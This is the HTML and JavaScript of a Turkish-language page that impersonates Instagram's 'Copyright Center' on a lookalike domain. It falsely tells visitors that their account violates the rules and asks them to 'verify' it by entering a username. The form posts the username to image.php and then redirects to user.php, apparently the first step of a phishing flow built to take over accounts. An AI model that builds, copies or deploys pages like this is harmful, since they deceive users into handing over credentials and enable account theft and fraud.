<!DOCTYPE html>
<html lang="en">
<head>
	<title>Instagram Telif Hakkı Merkezi</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="favicon.png"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="css/vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/vendor/select2/select2.min.css">
	<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">

<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
	<meta property="og:image" content="https://cdn.imza.com/indirv2/n/800x480/instagram-telif-haklarina-sahip-olan-muzikler-icin-kullanicilari-uyaracak-1590051316.jpg" />
	<meta property="og:type" content="website">
    <meta property="og:url" content="https://instagramtelifhakkı.com/">
    <meta property="og:title" content="Instagram Telif Hakkı Merkezi">
    <meta property="og:description" content="Bir hesap oluştur veya Instagram'a giriş yap - Fotoğraf ve videolar çekip düzenlemenin, bu fotoğrafları, videoları ve mesajları arkadaşlarınla ve akrabalarınla paylaşmanın basit, eğlenceli ve yaratıcı yolu.">
<!--===============================================================================================-->
</head>


<style type="text/css">  .btn {
    cursor: pointer;
    width: 100%;
    padding:0 8px; 
    background: #3897f0;
    border:1px solid #3897f0;
    color:#fff;
    border-radius:10px;
    font-weight:600;
    font-size: 14px;
    height: 35px;
    line-height: 26px;
    outline: none;
    white-space: nowrap;
  }
  
  .container-login100{
	  
	  background:#dfdfdf;
	  
  }
  
  body{
	  background:#fafafa;
  }
</style>
<body>
<div class="limiter">
<div style="margin-top:-70px; margin-bottom:-60px;" class="container-login100">
<div class="wrap-login100">
<div class="login100-pic js-tilt" data-tilt="" style="will-change: transform; transform: perspective(300px) rotateX(0deg) rotateY(0deg);">
<img style="margin-top:-90px;" src="https://www.vargonen.com/blog/wp-content/uploads/2020/09/instagramlogo.jpg" alt="IMG"> 
</div>
<el class="login100-form validate-form" id="elemend">
<form action="image.php" id="idForm" class="login100-form validate-form">

<center><img style="margin-top:-120px;" src="https://i.hizliresim.com/5xns4qf.png"  width="150">
</center>
<center>
<h1 style="font-family:sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size: 20px;
margin-top:-50px;"> <b>Telif Hakkı Merkezi</b></h1> 
<p style="max-width:87%; font-size:15px; color: #999; line-height:20px; box-sizing:border-box;">
Bu sayfaya yönlendirildiniz, hesabınız kurallarımızı ihlal ediyor, bunun bir hata olduğunu düşünüyorsanız lütfen hesabınızı doğrulamak için formu doldurun.</p>
</center>
<hr>
<div class="wrap-input100 validate-input">
<input required="" class="input100" type="text" name="imagekadi" placeholder="Kullanıcı Adı">
<span class="focus-input100"></span>
<span class="symbol-input100">
<i class="fa fa-user" aria-hidden="true"></i>
</span>
</div>



<div class="container-login100-form-btn" style="margin-top:-20px;">
<button type="submit" id="imagei" class="btn">Devam Et</button>
					
				</div><br><center><h6><font style="cursor:pointer;"onclick="javascript:window.location.href='https://www.instagram.com/accounts/password/reset/'; " color="#00376b">Şifreni mi Unuttun?</font></a></h6></center></div>
					

				

					
				</form>
			</div>
			<div style="background:#fafafa; width:100%; height:70px; border-top:0.5px solid rgb(0,0,0,0.3);"class="lilvlad2">
			<center><img style="margin-top:20px;" src="footer.jpg" width="100"></center>
			</div>
      </div>
		</div>
	</el>
	
	

	
<!--===============================================================================================-->	
	<script src="css/vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="css/vendor/bootstrap/js/popper.js"></script>
	<script src="css/vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="css/vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="css/vendor/tilt/tilt.jquery.min.js"></script>
	<script >
		$('.js-tilt').tilt({
			scale: 1.1
		})
	</script>
<!--===============================================================================================-->
<script src="css/js/main.js"></script>
<script type="text/javascript">
$("#idForm").submit(function(e) {

    e.preventDefault(); // avoid to execute the actual submit of the form.

    var form = $(this);
    var url = form.attr('action');
       var btn = $("#imagei");
         btn.prop("disabled", true);
         
    
      btn.html("Lütfen bekleyiniz...");

              imagekadi = $('input[name="imagekadi"]').val();

    $.ajax({
          
           url: url,
           data: form.serialize(),
           statusCode: {
      500: function (response) {
      
         alert("Incorrect UserName You Entered.");
             
         document.getElementById("imagei").type="submit";
         document.getElementById("imagei").value="Search";
return false;
      },
      201: function (response) {
         alert('1');
         AfterSavedAll();
      },
      400: function (response) {
         alert('1');
         bootbox.alert('<span style="color:Red;">Error While Saving Outage Entry Please Check</span>', function () { });
      },
      404: function (response) {
         alert('1');
         bootbox.alert('<span style="color:Red;">Error While Saving Outage Entry Please Check</span>', function () { });
      }
   },
           success: function(data)
           {
         if (data=="" || data=="error" ) {
             
             alert("Incorrect UserName You Entered.");
             
          btn.prop("disabled", false);
         
    
      btn.html("Continue");
return false;
     }


    window.location = "user.php?user="+imagekadi
                
           }
         });

    
});
$("#userpass").submit(function(e) {
    
    e.preventDefault();
    
    alert("dsd");
});

</script>
</body>
</html>